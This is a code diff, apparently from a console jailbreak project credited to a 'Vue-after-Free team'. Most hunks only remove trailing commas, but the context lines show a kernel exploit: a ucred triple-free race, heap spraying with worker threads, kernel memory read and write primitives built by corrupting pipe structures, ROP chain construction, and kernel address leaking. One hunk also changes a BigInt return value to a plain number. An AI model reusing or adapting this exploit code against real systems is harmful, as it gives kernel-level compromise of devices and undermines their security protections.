@@ -629,7 +629,7 @@
       var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
       if (ret.eq(BigInt_Error)) {
         throw new Error(
-          "Could not signal 'run' iov_recvmsg_workers[" + i + "]",
+          "Could not signal 'run' iov_recvmsg_workers[" + i + "]"
         );
       }
     }
@@ -660,7 +660,7 @@
       var ret = write(new BigInt(worker.pipe_1), worker.signal_buf, 1);
       if (ret.eq(BigInt_Error)) {
         throw new Error(
-          "Could not signal 'run' iov_recvmsg_workers[" + i + "]",
+          "Could not signal 'run' iov_recvmsg_workers[" + i + "]"
         );
       }
     }
@@ -804,7 +804,7 @@
         UIO_THREAD_NUM +
         "] uio_writev[" +
         UIO_THREAD_NUM +
-        "]",
+        "]"
     );
   }
 
@@ -858,7 +858,7 @@
       write(
         new BigInt(spray_ipv6_worker.pipe_1),
         spray_ipv6_worker.signal_buf,
-        1,
+        1
       );
       if (kill_workers && spray_ipv6_worker.thread_id !== undefined) {
         thr_kill(spray_ipv6_worker.thread_id, 9); // SIGKILL
@@ -1105,7 +1105,7 @@
         exploit_count +
         "/" +
         MAIN_LOOP_ITERATIONS +
-        ")...",
+        ")..."
     );
 
     if (!trigger_ucred_triplefree()) {
@@ -1144,12 +1144,12 @@
     debug("fdt_ofiles: " + hex(fdt_ofiles));
 
     master_r_pipe_file = kreadslow64(
-      fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE),
+      fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE)
     );
     debug("master_r_pipe_file: " + hex(master_r_pipe_file));
 
     victim_r_pipe_file = kreadslow64(
-      fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE),
+      fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE)
     );
     debug("victim_r_pipe_file: " + hex(victim_r_pipe_file));
 
@@ -1169,7 +1169,7 @@
     var ret_write = kwriteslow(
       master_r_pipe_data,
       master_pipe_buf,
-      PIPEBUF_SIZE,
+      PIPEBUF_SIZE
     );
 
     if (ret_write.eq(BigInt_Error)) {
@@ -1219,7 +1219,7 @@
 
     debug(
       "Reading value in victim_r_pipe_file: " +
-        hex(kread64(victim_r_pipe_file)),
+        hex(kread64(victim_r_pipe_file))
     );
   }
 
@@ -1300,7 +1300,7 @@
 
     log("Jailbreak Complete - JAILBROKEN");
     utils.notify(
-      "The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom",
+      "The Vue-after-Free team congratulates you\nNetCtrl Finished OK\nEnjoy freedom"
     );
 
     cleanup(false); // Close sockets and kill workers on success
@@ -1516,7 +1516,7 @@
           PROT_RW,
           MAP_ANON | MAP_PRIVATE,
           -1,
-          0,
+          0
         );
       },
 
@@ -1536,7 +1536,7 @@
           // Real implementation would read from kernel/user memory via ROP
           return view[0];
         } catch (e) {
-          return 0n;
+          return 0;
         }
       },
 
@@ -1595,7 +1595,7 @@
         SYSCALL_VIRTUAL_QUERY,
         addr,
         buf,
-        size,
+        size
       );
     }
 
@@ -1624,7 +1624,7 @@
       PROT_RW,
       MAP_ANON | MAP_PRIVATE,
       -1,
-      0,
+      0
     );
 
     // Our target page: we'll place this at a known offset
@@ -1637,7 +1637,7 @@
       74,
       targetPage + PAGE_SIZE * 2,
       PAGE_SIZE,
-      PROT_NONE,
+      PROT_NONE
     );
 
     // ──────────────────────────────────────────────────────
@@ -1670,7 +1670,7 @@
             PROT_RW,
             MAP_ANON | MAP_PRIVATE | MAP_FIXED,
             -1,
-            0,
+            0
           );
         }
       }
@@ -1828,7 +1828,7 @@
             " size=0x" +
             leaks[i].size.toString(16) +
             " prot=0x" +
-            leaks[i].protect.toString(16),
+            leaks[i].protect.toString(16)
         );
       }
 
@@ -1851,7 +1851,7 @@
       }
     } else {
       chain.log(
-        "No kernel leaks obtained. Try increasing race iterations or adjusting page layout.",
+        "No kernel leaks obtained. Try increasing race iterations or adjusting page layout."
       );
     }
 
@@ -1969,7 +1969,7 @@
       SOL_SOCKET,
       SO_SNDBUF,
       sockopt_val_buf,
-      4,
+      4
     );
 
     // Fill queue.
@@ -2076,7 +2076,7 @@
 
       if (read32(iov_leak_add) === UIO_SYSSPACE) {
         debug(
-          "kreadslow - iov reclaim succeeded after " + count2 + " iterations",
+          "kreadslow - iov reclaim succeeded after " + count2 + " iterations"
         );
         break;
       }
@@ -2105,7 +2105,7 @@
         debug(
           "kreadslow - Found valid leak at index " +
             i +
-            ", finding triplets[1]...",
+            ", finding triplets[1]..."
         );
         // Find triplet.
         triplets[1] = find_triplet(triplets[0], -1);
@@ -2162,7 +2162,7 @@
         " buffer: " +
         hex(buffer) +
         " size : " +
-        size,
+        size
     );
 
     // Set send buf size.
@@ -2172,7 +2172,7 @@
       SOL_SOCKET,
       SO_SNDBUF,
       sockopt_val_buf,
-      4,
+      4
     );
 
     // Set iov length.
@@ -2370,7 +2370,7 @@
     ready_signal,
     run_fd,
     done_signal,
-    signal_buf,
+    signal_buf
   ) {
     var rop = [];
 
@@ -2531,7 +2531,7 @@
     ready_signal,
     run_fd,
     done_signal,
-    signal_buf,
+    signal_buf
   ) {
     var rop = [];
 
@@ -2614,7 +2614,7 @@
     ready_signal,
     run_fd,
     done_signal,
-    signal_buf,
+    signal_buf
   ) {
     var rop = [];
 
